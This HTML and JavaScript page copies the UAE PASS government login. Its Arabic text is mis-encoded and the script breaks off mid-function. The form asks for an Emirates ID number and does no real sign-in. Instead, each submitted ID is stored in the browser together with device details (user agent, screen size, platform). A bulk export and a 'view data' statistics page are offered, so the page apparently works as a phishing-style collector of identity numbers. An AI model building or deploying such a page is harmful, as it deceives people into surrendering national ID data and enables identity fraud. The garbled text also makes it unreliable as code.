<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="rectangle"></div>
    
    <div class="main-wrapper">
        <div class="container">
            <!-- Ø±Ø£Ø³ Ø§Ù„ØµÙØ­Ø© -->
            <header class="header">
                <div class="logo">
                    <img src="self_service.png" alt="UAE Pass Logo">
                </div>
                
                <h1 class="login-to-uaepass">
                    Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¹Ù† Ø·Ø±ÙŠÙ‚ Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø±Ù‚Ù…ÙŠØ©
                </h1>
            </header>
            
            <!-- Ø­Ø§Ù„Ø© Ø§Ù„Ø­ÙØ¸ -->
            <div id="saveStatus" class="save-status" style="display: none;">
                <div id="statusContent"></div>
            </div>
            
            <!-- Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ -->
            <main class="login-content">
                <!-- Ù†Ù…ÙˆØ°Ø¬ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
                <form id="loginForm">
                    <!-- Ø­Ù‚Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… -->
                    <div class="form-group">
                        <label class="form-label" for="username">
                            <i class="fas fa-id-card"></i> Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©
                        </label>
                        <input type="text" 
                               class="form-input" 
                               id="username" 
                               name="username" 
                               placeholder="784XXXXXXXXXXXX (15 Ø±Ù‚Ù…Ù‹Ø§)"
                               pattern="\d{15}"
                               title="ÙŠØ¬Ø¨ Ø¥Ø¯Ø®Ø§Ù„ 15 Ø±Ù‚Ù…Ø§Ù‹"
                               maxlength="15"
                               required>
                        <div class="form-hint">
                            <i class="fas fa-info-circle"></i> Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø¥Ù…Ø§Ø±Ø§ØªÙŠ ÙŠØªÙƒÙˆÙ† Ù…Ù† 15 Ø±Ù‚Ù…Ù‹Ø§ ÙˆÙŠØ¨Ø¯Ø£ Ø¨Ù€ 784
                        </div>
                    </div>
                    
                    <!-- Ø®Ø§Ù†Ø© Ø§Ù„Ø§Ø®ØªÙŠØ§Ø± "ØªØ°ÙƒØ±Ù†ÙŠ" -->
                    <div class="form-options">
                        <div class="form-check">
                            <input type="checkbox" checked id="rememberme" name="rememberme">
                            <label class="checkbox-label" for="rememberme">
                                <i class="fas fa-save"></i> ØªØ°ÙƒØ±Ù†ÙŠ
                            </label>
                        </div>
                    </div>
                    
                    <!-- Ø²Ø± ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
                    <div class="form-group-button">
                        <button type="submit" class="btn-login" id="submitButton">
 ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
                        </button>
                    </div>
                </form>
                
                <!-- Ø§Ù„ÙØ§ØµÙ„ -->
                <div class="divider">
                    <hr class="style">
                    <span class="divider-text">Ø£Ùˆ</span>
                </div>
                
                <!-- Ø±ÙˆØ§Ø¨Ø· Ø¥Ø¶Ø§ÙÙŠØ© -->
                <div class="account-actions">
                    <div class="dont-have-account">
                        <span class="account-text">
                            <i class="fas fa-question-circle"></i> Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ
                        </span>
                        <a href="#" class="create-new-account">
                            <i class="fas fa-user-plus"></i> Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯
                        </a>
                    </div>
                    
                    <div class="recover-account">
                        <a href="#" class="recover-link">
                            <i class="fas fa-key"></i> ÙƒÙŠÙÙŠØ© Ø§Ø³ØªØ¹Ø§Ø¯Ø© Ø§Ù„Ø­Ø³Ø§Ø¨ØŸ
                        </a>
                    </div>
                    
                    <!-- Ø±Ø§Ø¨Ø· Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª -->
              
                </div>
                
                <!-- Ø²Ø± ØªØ·Ø¨ÙŠÙ‚ UAE PASS -->
             
            </main>
            
            <!-- ØªØ°ÙŠÙŠÙ„ Ø§Ù„ØµÙØ­Ø© -->
            <footer class="footer">
                <div class="footer-links">
                    <a href="#" class="menu-link">
                        <i class="fas fa-headset"></i> Ø§Ù„Ø¯Ø¹Ù…
                    </a>
                    <span class="menu-separator">|</span>
                    <a href="#" class="menu-link">
                        <i class="fas fa-question-circle"></i> Ø§Ù„Ø£Ø³Ø¦Ù„Ø© Ø§Ù„Ø´Ø§Ø¦Ø¹Ø©
                    </a>
                    <span class="menu-separator">|</span>
                    <a href="#" class="menu-link">
                        <i class="fas fa-info-circle"></i> Ù†Ø¨Ø°Ø© Ø¹Ø§Ù…Ø©
                    </a>
                    <span class="menu-separator">|</span>
                    <a href="view-data.html" class="menu-link">
                        <i class="fas fa-chart-bar"></i> Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                    </a>
                </div>
                <div class="copyright">
                    <i class="fas fa-copyright"></i> Ø­Ù‚ÙˆÙ‚ Ø§Ù„Ù†Ø´Ø± Â© 2025 Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø±Ù‚Ù…ÙŠØ© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©.
                </div>
            </footer>
        </div>
    </div>

    <!-- Ù†Ø¸Ø§Ù… Ø§Ù„Ø­ÙØ¸ Ø§Ù„Ù…Ø­Ù„ÙŠ -->
    <script>
        // === Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø­Ù„ÙŠ ===
        class LocalIDStorage {
            constructor() {
                this.STORAGE_KEY = 'uae_id_records';
                this.BACKUP_KEY_PREFIX = 'uae_id_backup_';
                this.initStorage();
            }
            
            // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØªØ®Ø²ÙŠÙ†
            initStorage() {
                if (!localStorage.getItem(this.STORAGE_KEY)) {
                    localStorage.setItem(this.STORAGE_KEY, JSON.stringify([]));
                    console.log('ğŸ“‚ ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ ØªØ®Ø²ÙŠÙ† Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ø³Ø¬Ù„Ø§Øª');
                }
            }
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©
            validateID(idNumber) {
                if (!idNumber || typeof idNumber !== 'string') {
                    return {
                        isValid: false,
                        message: 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©'
                    };
                }
                
                // ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø±Ù‚Ù…
                const cleanId = idNumber.replace(/\D/g, '');
                
                // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø·ÙˆÙ„
                if (cleanId.length !== 15) {
                    return {
                        isValid: false,
                        message: 'Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 15 Ø±Ù‚Ù…Ø§Ù‹'
                    };
                }
                
                // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø·
                if (!/^\d+$/.test(cleanId)) {
                    return {
                        isValid: false,
                        message: 'ÙŠØ¬Ø¨ Ø£Ù† ÙŠØ­ØªÙˆÙŠ Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ø¹Ù„Ù‰ Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø·'
                    };
                }
                
                // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨Ø§Ø¯Ø¦Ø©
                if (!cleanId.startsWith('784')) {
                    return {
                        isValid: false,
                        message: 'Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø¥Ù…Ø§Ø±Ø§ØªÙŠ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ 784'
                    };
                }
                
                return {
                    isValid: true,
                    cleanedId: cleanId,
                    prefix: cleanId.substring(0, 3),
                    birthYear: cleanId.substring(3, 7),
                    randomPart: cleanId.substring(7, 14),
                    checkDigit: cleanId.substring(14, 15)
                };
            }
            
            // Ø­ÙØ¸ Ø§Ù„Ø³Ø¬Ù„
            saveRecord(idNumber, rememberMe) {
                try {
                    const validation = this.validateID(idNumber);
                    if (!validation.isValid) {
                        throw new Error(validation.message);
                    }
                    
                    // Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø³Ø¬Ù„
                    const record = {
                        id: this.generateUniqueId(),
                        idNumber: validation.cleanedId,
                        idDetails: {
                            prefix: validation.prefix,
                            birthYear: validation.birthYear,
                            randomPart: validation.randomPart,
                            checkDigit: validation.checkDigit
                        },
                        rememberMe: rememberMe,
                        timestamp: new Date().toISOString(),
                        date: new Date().toLocaleDateString('ar-SA'),
                        time: new Date().toLocaleTimeString('ar-SA'),
                        userAgent: navigator.userAgent.substring(0, 100),
                        screenSize: `${window.screen.width}x${window.screen.height}`,
                        language: navigator.language,
                        platform: navigator.platform,
                        status: 'active',
                        source: 'manual_entry'
                    };
                    
                    // Ø¬Ù„Ø¨ Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ø­Ø§Ù„ÙŠØ©
                    const records = this.getRecords();
                    
                    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙƒØ±Ø§Ø±
                    const isDuplicate = records.some(r => r.idNumber === record.idNumber);
                    if (isDuplicate) {
                        record.status = 'duplicate';
                    }
                    
                    // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø³Ø¬Ù„ Ø§Ù„Ø¬Ø¯ÙŠØ¯
                    records.push(record);
                    
                    // Ø­ÙØ¸ ÙÙŠ localStorage
                    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(records));
                    
                    console.log('âœ… ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø³Ø¬Ù„:', record);
                    
                    return {
                        success: true,
                        record: record,
                        isDuplicate: isDuplicate,
                        totalRecords: records.length
                    };
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„Ø³Ø¬Ù„:', error);
                    return {
                        success: false,
                        error: error.message
                    };
                }
            }
            
            // Ø¬Ù„Ø¨ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
            getRecords() {
                try {
                    const recordsJson = localStorage.getItem(this.STORAGE_KEY);
                    return recordsJson ? JSON.parse(recordsJson) : [];
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø³Ø¬Ù„Ø§Øª:', error);
                    return [];
                }
            }
            
            // Ø¬Ù„Ø¨ Ø¹Ø¯Ø¯ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
            getRecordCount() {
                return this.getRecords().length;
            }
            
            // Ø¬Ù„Ø¨ Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø§Ù„ÙØ±ÙŠØ¯Ø©
            getUniqueRecords() {
                const records = this.getRecords();
                const uniqueMap = new Map();
                
                records.forEach(record => {
                    if (!uniqueMap.has(record.idNumber)) {
                        uniqueMap.set(record.idNumber, record);
                    }
                });
                
                return Array.from(uniqueMap.values());
            }
            
            // ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            exportData(format = 'json') {
                const data = {
                    records: this.getRecords(),
                    exportInfo: {
                        date: new Date().toISOString(),
                        totalRecords: this.getRecordCount(),
                        uniqueRecords: this.getUniqueRecords().length,
                        system: 'UAE ID Storage System'
                    }
                };
                
                let content, mimeType, extension;
                
                if (format === 'csv') {
                    // ØªØ­ÙˆÙŠÙ„ Ù„Ù€ CSV
                    const headers = ['Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©', 'Ø§Ù„ØªØ§Ø±ÙŠØ®', 'Ø§Ù„ÙˆÙ‚Øª', 'Ø­Ø§Ù„Ø© Ø§Ù„ØªØ°ÙƒØ±', 'Ø§Ù„Ø´Ø§Ø´Ø©', 'Ø§Ù„Ù…ØªØµÙØ­'];
                    const rows = data.records.map(record => [
                        record.idNumber,
                        record.date,
                        record.time,
                        record.rememberMe ? 'Ù†Ø¹Ù…' : 'Ù„Ø§',
                        record.screenSize,
                        record.userAgent.substring(0, 30) + '...'
                    ]);
                    
                    const csvContent = [
                        headers.join(','),
                        ...rows.map(row => row.join(','))
                    ].join('\n');
                    
                    content = '\ufeff' + csvContent;
                    mimeType = 'text/csv;charset=utf-8;';
                    extension = 'csv';
                    
                } else {
                    // JSON Ø§ÙØªØ±Ø§Ø¶ÙŠ
                    content = JSON.stringify(data, null, 2);
                    mimeType = 'application/json';
                    extension = 'json';
                }
                
                return { content, mimeType, extension };
            }
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©
            createBackup() {
                const backupKey = `${this.BACKUP_KEY_PREFIX}${Date.now()}`;
                const records = this.getRecords();
                const backupData = {
                    records: records,
                    backupDate: new Date().toISOString(),
                    totalRecords: records.length
                };
                
                localStorage.setItem(backupKey, JSON.stringify(backupData));
                console.log(`ğŸ“¦ ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©: ${backupKey}`);
                
                return backupKey;
            }
            
            // Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
            clearRecords() {
                const recordCount = this.getRecordCount();
                
                if (recordCount === 0) {
                    return { success: true, message: 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ø³Ø¬Ù„Ø§Øª Ù„Ù„Ù…Ø³Ø­', cleared: 0 };
                }
                
                // Ø¥Ù†Ø´Ø§Ø¡ Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© Ù‚Ø¨Ù„ Ø§Ù„Ù…Ø³Ø­
                this.createBackup();
                
                // Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
                localStorage.setItem(this.STORAGE_KEY, JSON.stringify([]));
                
                console.log(`ğŸ—‘ï¸ ØªÙ… Ù…Ø³Ø­ ${recordCount} Ø³Ø¬Ù„Ø§Ù‹`);
                return { 
                    success: true, 
                    message: `ØªÙ… Ù…Ø³Ø­ ${recordCount} Ø³Ø¬Ù„Ø§Ù‹`, 
                    cleared: recordCount 
                };
            }
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ø¹Ø±Ù ÙØ±ÙŠØ¯
            generateUniqueId() {
                return 'id_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            }
        }

        // === ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù… ===
        const idStorage = new LocalIDStorage();
        
        // === Ø¹Ù†Ø§ØµØ± DOM ===
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const submitButton = document.getElementById('submitButton');
        const saveStatus = document.getElementById('saveStatus');
        const statusContent = document.getElementById('statusContent');

        // === ØªÙ†Ø³ÙŠÙ‚Ø§Øª CSS ===
        const styles = document.createElement('style');
        styles.textContent = `
            .save-status {
                padding: 15px;
                margin: 15px 0;
                border-radius: 10px;
                animation: slideDown 0.3s ease-out;
            }
            
            .status-success {
                background-color: #d4edda;
                color: #155724;
                border: 1px solid #c3e6cb;
            }
            
            .status-error {
                background-color: #f8d7da;
                color: #721c24;
                border: 1px solid #f5c6cb;
            }
            
            .status-info {
                background-color: #d1ecf1;
                color: #0c5460;
                border: 1px solid #bee5eb;
            }
            
            .status-warning {
                background-color: #fff3cd;
                color: #856404;
                border: 1px solid #ffeaa7;
            }
            
            @keyframes slideDown {
                from {
                    opacity: 0;
                    transform: translateY(-20px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.05); }
                100% { transform: scale(1); }
            }
            
            .form-label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                color: #454f63;
            }
            
            .form-hint {
                font-size: 12px;
                color: #78849e;
                margin-top: 5px;
                display: flex;
                align-items: center;
                gap: 5px;
            }
            
            .view-data-link {
                margin-top: 15px;
                text-align: center;
            }
            
            .data-link {
                color: #0D98BA;
                text-decoration: none;
                font-weight: 600;
                display: inline-flex;
                align-items: center;
                gap: 8px;
                padding: 8px 15px;
                border: 2px solid #0D98BA;
                border-radius: 8px;
                transition: all 0.3s;
            }
            
            .data-link:hover {
                background-color: #0D98BA;
                color: white;
                transform: translateY(-2px);
            }
            
            .btn-login.loading {
                opacity: 0.8;
                cursor: wait;
            }
            
            .btn-login.success {
                background-color: #00ac75 !important;
            }
            
            .btn-login.error {
                background-color: #ff4757 !important;
            }
            
            .id-preview {
                background: #f8f9fa;
                padding: 10px;
                border-radius: 8px;
                margin: 10px 0;
                font-family: monospace;
                font-size: 16px;
                text-align: center;
                border: 1px dashed #dee2e6;
            }
            
            .record-details {
                background: white;
                border-radius: 8px;
                padding: 15px;
                margin: 15px 0;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            
            .record-details h4 {
                margin-top: 0;
                color: #0D98BA;
                border-bottom: 2px solid #f0f0f0;
                padding-bottom: 10px;
            }
            
            .details-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                gap: 10px;
                margin-top: 10px;
            }
            
            .detail-item {
                padding: 8px;
                background: #f8fafc;
                border-radius: 5px;
            }
            
            .detail-label {
                font-weight: 600;
                color: #78849e;
                font-size: 12px;
            }
            
            .detail-value {
                color: #454f63;
                font-size: 14px;
            }
        `;
        document.head.appendChild(styles);

        // === Ø¹Ø±Ø¶ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ ===
        function showMessage(message, type = 'info', duration = 5000) {
            saveStatus.style.display = 'block';
            saveStatus.className = `save-status status-${type}`;
            statusContent.innerHTML = `
                <div style="display: flex; align-items: center; gap: 10px;">
                    <i class="fas fa-${getIconForType(type)}"></i>
                    <span>${message}</span>
                </div>
            `;
            
            if (duration > 0) {
                setTimeout(() => {
                    saveStatus.style.display = 'none';
                }, duration);
            }
        }
        
        function getIconForType(type) {
            const icons = {
                success: 'check-circle',
                error: 'exclamation-circle',
                warning: 'exclamation-triangle',
                info: 'info-circle'
            };
            return icons[type] || 'info-circle';
        }

        // === ØªØ­Ø¯ÙŠØ« Ø²Ø± Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ===
        function updateButtonState(state, text = null) {
            const originalText = submitButton.innerHTML;
            
            submitButton.classList.remove('loading', 'success', 'error');
            
            switch(state) {
                case 'loading':
                    submitButton.disabled = true;
                    submitButton.classList.add('loading');
                    submitButton.innerHTML = `
                        <i class="fas fa-spinner fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø­ÙØ¸...
                    `;
                    break;
                    
                case 'success':
                    submitButton.disabled = false;
                    submitButton.classList.add('success');
                    submitButton.innerHTML = text || `
                        <i class="fas fa-check"></i> ØªÙ… Ø§Ù„Ø­ÙØ¸ Ø¨Ù†Ø¬Ø§Ø­
                    `;
                    break;
                    
                case 'error':
                    submitButton.disabled = false;
                    submitButton.classList.add('error');
                    submitButton.innerHTML = text || originalText;
                    break;
                    
                default:
                    submitButton.disabled = false;
                    submitButton.innerHTML = originalText;
            }
        }

        // === Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ ===
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const idNumber = usernameInput.value.trim();
            const rememberMe = document.getElementById('rememberme').checked;
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ
            if (!idNumber) {
                showMessage('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©', 'error');
                usernameInput.focus();
                return;
            }
            
            // ØªØ­Ø¯ÙŠØ« Ø­Ø§Ù„Ø© Ø§Ù„Ø²Ø±
            updateButtonState('loading');
            
            try {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªØ£Ø®ÙŠØ± Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØªØ¬Ø±Ø¨Ø© ÙˆØ§Ù‚Ø¹ÙŠØ©
                await new Promise(resolve => setTimeout(resolve, 800));
                
                // Ø­ÙØ¸ Ø§Ù„Ø³Ø¬Ù„
                const result = idStorage.saveRecord(idNumber, rememberMe);
                
                if (result.success) {
                    // Ø¹Ø±Ø¶ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø­ÙØ¸
                    showMessage(
                        `âœ… ØªÙ… Ø­ÙØ¸ Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ø¨Ù†Ø¬Ø§Ø­! (${idStorage.getRecordCount()} Ø³Ø¬Ù„Ø§Ù‹)`,
                        'success',
                        8000
                    );
                    
                    // Ø¹Ø±Ø¶ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø³Ø¬Ù„
                    displayRecordDetails(result.record);
                    
                    // ØªØ­Ø¯ÙŠØ« Ø²Ø± Ø§Ù„ØªØ³Ø¬ÙŠÙ„
                    updateButtonState('success');
                    
                    // Ø­ÙØ¸ ØªÙØ¶ÙŠÙ„Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
                    if (rememberMe) {
                        localStorage.setItem('last_entered_id', result.record.idNumber);
                        localStorage.setItem('auto_remember', 'true');
                    } else {
                        localStorage.removeItem('last_entered_id');
                        localStorage.removeItem('auto_remember');
                    }
                    
                    // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ±
                    setTimeout(() => {
                        if (!rememberMe) {
                            usernameInput.value = '';
                        }
                        updateButtonState('default');
                    }, 3000);
                    
                    // Ø¹Ø±Ø¶ Ø®ÙŠØ§Ø± Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø¹Ø±Ø¶
                    setTimeout(() => {
                        showMessage(
                            `ÙŠÙ…ÙƒÙ†Ùƒ <a href="view-data.html" style="color: #155724; font-weight: bold;">Ø¹Ø±Ø¶ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§Øª</a> (${idStorage.getRecordCount()} Ø³Ø¬Ù„Ø§Ù‹)`,
                            'info',
                            10000
                        );
                    }, 2000);
                    
                } else {
                    showMessage(`âŒ ${result.error}`, 'error');
                    updateButtonState('error');
                }
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ØºÙŠØ± Ù…ØªÙˆÙ‚Ø¹:', error);
                showMessage(`Ø­Ø¯Ø« Ø®Ø·Ø£ ØºÙŠØ± Ù…ØªÙˆÙ‚Ø¹: ${error.message}`, 'error');
                updateButtonState('error');
            }
        });

        // === Ø¹Ø±Ø¶ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø³Ø¬Ù„ Ø§Ù„Ù…Ø­ÙÙˆØ¸ ===
        function displayRecordDetails(record) {
            const existingDetails = document.querySelector('.record-details');
            if (existingDetails) {
                existingDetails.remove();
            }
            
            const detailsDiv = document.createElement('div');
            detailsDiv.className = 'record-details';
            detailsDiv.innerHTML = `
                <h4><i class="fas fa-info-circle"></i> ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø³Ø¬Ù„ Ø§Ù„Ù…Ø­ÙÙˆØ¸</h4>
                
                <div class="id-preview">
                    ${record.idNumber}
                </div>
                
                <div class="details-grid">
                    <div class="detail-item">
                        <div class="detail-label">ØªØ§Ø±ÙŠØ® Ø§Ù„Ø­ÙØ¸</div>
                        <div class="detail-value">${record.date}</div>
                    </div>
                    
                    <div class="detail-item">
                        <div class="detail-label">ÙˆÙ‚Øª Ø§Ù„Ø­ÙØ¸</div>
                        <div class="detail-value">${record.time}</div>
                    </div>
                    
                    <div class="detail-item">
                        <div class="detail-label">Ø­Ø§Ù„Ø© Ø§Ù„ØªØ°ÙƒØ±</div>
                        <div class="detail-value">${record.rememberMe ? 'Ù…ÙØ¹Ù„ âœ“' : 'ØºÙŠØ± Ù…ÙØ¹Ù„ âœ—'}</div>
                    </div>
                    
                    <div class="detail-item">
                        <div class="detail-label">Ø±Ù‚Ù… ÙØ±ÙŠØ¯</div>
                        <div class="detail-value">${record.id.substring(0, 15)}...</div>
                    </div>
                    
                    <div class="detail-item">
                        <div class="detail-label">Ø¨Ø§Ø¯Ø¦Ø© Ø§Ù„Ù‡ÙˆÙŠØ©</div>
                        <div class="detail-value">${record.idDetails.prefix}</div>
                    </div>
                    
                    <div class="detail-item">
                        <div class="detail-label">Ø³Ù†Ø© Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</div>
                        <div class="detail-value">${record.idDetails.birthYear}</div>
                    </div>
                </div>
                
                <div style="margin-top: 15px; text-align: center;">
                    <button onclick="viewAllRecords()" style="
                        background: #0D98BA;
                        color: white;
                        border: none;
                        padding: 8px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 14px;
                    ">
                        <i class="fas fa-eye"></i> Ø¹Ø±Ø¶ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
                    </button>
                    
                    <button onclick="exportRecords()" style="
                        background: #00ac75;
                        color: white;
                        border: none;
                        padding: 8px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 14px;
                        margin-right: 10px;
                    ">
                        <i class="fas fa-download"></i> ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                    </button>
                </div>
            `;
            
            const form = document.getElementById('loginForm');
            form.parentNode.insertBefore(detailsDiv, form.nextSibling);
        }

        // === Ø¯ÙˆØ§Ù„ Ø¥Ø¶Ø§ÙÙŠØ© ===
        window.viewAllRecords = function() {
            window.location.href = 'view-data.html';
        };
        
        window.exportRecords = function(format = 'json') {
            const exportData = idStorage.exportData(format);
            
            const blob = new Blob([exportData.content], { type: exportData.mimeType });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `uae_id_records_${new Date().toISOString().slice(0,10)}.${exportData.extension}`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            showMessage(`âœ… ØªÙ… ØªØµØ¯ÙŠØ± ${idStorage.getRecordCount()} Ø³Ø¬Ù„Ø§Ù‹ Ø¥Ù„Ù‰ Ù…Ù„Ù ${exportData.extension.toUpperCase()}`, 'success');
        };

        // === ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø© ===
        window.addEventListener('DOMContentLoaded', function() {
            console.log('ğŸš€ ØµÙØ­Ø© Ø§Ù„ØªÙ‚Ø¯ÙŠÙ… Ø¬Ø§Ù‡Ø²Ø©');
            
            // ØªØ­Ù…ÙŠÙ„ Ø¢Ø®Ø± Ø±Ù‚Ù… Ù‡ÙˆÙŠØ© ØªÙ… Ø¥Ø¯Ø®Ø§Ù„Ù‡
            const lastId = localStorage.getItem('last_entered_id');
            const autoRemember = localStorage.getItem('auto_remember');
            
            if (lastId && autoRemember === 'true') {
                usernameInput.value = lastId;
                document.getElementById('rememberme').checked = true;
                
                showMessage(
                    `ØªÙ… ØªØ­Ù…ÙŠÙ„ Ø¢Ø®Ø± Ø±Ù‚Ù… Ù‡ÙˆÙŠØ© ØªÙ… Ø¥Ø¯Ø®Ø§Ù„Ù‡: ${lastId}`,
                    'info',
                    3000
                );
            }
            
            // Ø¹Ø±Ø¶ Ø¹Ø¯Ø¯ Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©
            const recordCount = idStorage.getRecordCount();
            if (recordCount > 0) {
                const statsLink = document.querySelector('a[href="view-data.html"]');
                if (statsLink) {
                    statsLink.innerHTML += ` (${recordCount})`;
                }
                
                console.log(`ğŸ“Š Ù„Ø¯ÙŠÙƒ ${recordCount} Ø³Ø¬Ù„Ø§Ù‹ Ù…Ø­ÙÙˆØ¸Ø§Ù‹`);
            }
            
            // Ø¥Ø¶Ø§ÙØ© Ù…Ø¤Ø´Ø± Ø§Ù„ÙƒØªØ§Ø¨Ø© Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
            usernameInput.addEventListener('input', function(e) {
                const value = e.target.value.replace(/\D/g, '');
                if (value.length <= 15) {
                    e.target.value = value;
                    
